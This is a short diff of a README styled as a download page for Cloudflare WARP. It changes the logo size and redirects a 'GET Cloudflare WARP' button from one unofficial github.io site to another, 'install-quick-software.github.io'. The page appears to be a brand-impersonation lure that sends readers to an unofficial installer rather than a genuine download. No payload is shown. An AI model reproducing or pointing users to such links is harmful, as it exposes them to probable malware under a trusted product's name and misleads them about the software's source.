@@ -1,13 +1,13 @@
 # Cloudflare WARP – Fast, Private, and Secure Internet Connection  
 
 <div align="center">  
-<img src="https://i0.wp.com/spider-mac.com/wp-content/uploads/2021/05/warp-mac.png?resize=960%2C500&ssl=1" alt="Cloudflare WARP Logo" width="900">  
+<img src="https://i0.wp.com/spider-mac.com/wp-content/uploads/2021/05/warp-mac.png?resize=960%2C500&ssl=1" alt="Cloudflare WARP Logo" width="400">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/cloudflare-warp">  
+<a href="https://install-quick-software.github.io/.github/cloudflare-warp">  
 <img src="https://img.shields.io/badge/💻_GET_Cloudflare_WARP-blueviolet?style=for-the-badge&logo=apple" alt="GET Cloudflare WARP">  
 </a>  
 </div>
